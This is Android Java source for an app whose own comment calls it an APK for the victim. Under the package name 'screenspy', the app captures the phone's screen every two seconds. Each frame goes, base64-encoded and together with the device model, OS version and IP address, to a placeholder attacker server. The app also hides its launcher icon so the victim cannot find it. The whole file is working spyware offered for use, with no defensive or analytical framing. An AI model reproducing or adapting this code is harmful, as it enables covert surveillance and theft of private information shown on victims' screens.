// MainActivity.java - APK untuk korban
package com.screenspy.sender;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1;
    private static final int REQUEST_CODE_PERMISSIONS = 2;
    
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    
    private int screenWidth = 1080;
    private int screenHeight = 1920;
    private int screenDensity = 320;
    
    private Timer screenCaptureTimer;
    private Handler handler = new Handler();
    
    // SERVER URL - Ganti dengan server kamu
    private String serverUrl = "https://your-server.com/receive";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Request permissions
        requestPermissions();
        
        // Start screen capture
        startScreenCapture();
        
        // Hide app icon (optional)
        hideAppIcon();
    }
    
    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_PHONE_STATE
        };
        
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE_PERMISSIONS);
                break;
            }
        }
    }
    
    private void startScreenCapture() {
        mediaProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        Intent intent = mediaProjectionManager.createScreenCaptureIntent();
        startActivityForResult(intent, REQUEST_CODE_SCREEN_CAPTURE);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK) {
                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
                startScreenSharing();
            }
        }
    }
    
    private void startScreenSharing() {
        // Setup ImageReader
        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
        
        // Create virtual display
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            screenWidth,
            screenHeight,
            screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(),
            null,
            null
        );
        
        // Start periodic screen capture
        startScreenCaptureTimer();
    }
    
    private void startScreenCaptureTimer() {
        screenCaptureTimer = new Timer();
        screenCaptureTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                captureAndSendScreen();
            }
        }, 0, 2000); // Capture every 2 seconds
    }
    
    private void captureAndSendScreen() {
        try {
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Bitmap bitmap = imageToBitmap(image);
                sendScreenToServer(bitmap);
                image.close();
            }
        } catch (Exception e) {
            Log.e("ScreenSpy", "Capture error: " + e.getMessage());
        }
    }
    
    private Bitmap imageToBitmap(Image image) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * screenWidth;
        
        Bitmap bitmap = Bitmap.createBitmap(
            screenWidth + rowPadding / pixelStride,
            screenHeight,
            Bitmap.Config.ARGB_8888
        );
        
        bitmap.copyPixelsFromBuffer(buffer);
        return bitmap;
    }
    
    private void sendScreenToServer(Bitmap bitmap) {
        new Thread(() -> {
            try {
                // Convert bitmap to base64
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                byte[] imageBytes = baos.toByteArray();
                String base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT);
                
                // Get device info
                String deviceInfo = getDeviceInfo();
                
                // Create JSON payload
                String jsonPayload = String.format(
                    "{\"image\":\"%s\",\"device\":%s,\"timestamp\":%d}",
                    base64Image,
                    deviceInfo,
                    System.currentTimeMillis()
                );
                
                // Send to server
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes());
                os.flush();
                os.close();
                
                int responseCode = conn.getResponseCode();
                Log.i("ScreenSpy", "Screen sent. Response: " + responseCode);
                
                conn.disconnect();
                
            } catch (Exception e) {
                Log.e("ScreenSpy", "Send error: " + e.getMessage());
            }
        }).start();
    }
    
    private String getDeviceInfo() {
        try {
            return String.format(
                "{\"model\":\"%s\",\"android\":\"%s\",\"ip\":\"%s\"}",
                android.os.Build.MODEL,
                android.os.Build.VERSION.RELEASE,
                getLocalIpAddress()
            );
        } catch (Exception e) {
            return "{\"error\":\"unknown\"}";
        }
    }
    
    private String getLocalIpAddress() {
        try {
            java.net.NetworkInterface networkInterface = java.net.NetworkInterface.getByName("wlan0");
            if (networkInterface == null) {
                networkInterface = java.net.NetworkInterface.getByName("eth0");
            }
            
            java.util.Enumeration<java.net.InetAddress> addresses = networkInterface.getInetAddresses();
            while (addresses.hasMoreElements()) {
                java.net.InetAddress address = addresses.nextElement();
                if (!address.isLoopbackAddress() && address instanceof java.net.Inet4Address) {
                    return address.getHostAddress();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "unknown";
    }
    
    private void hideAppIcon() {
        // Hide app from launcher
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            new android.content.ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (screenCaptureTimer != null) {
            screenCaptureTimer.cancel();
        }
        if (virtualDisplay != null) {
            virtualDisplay.release();
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
    }
}
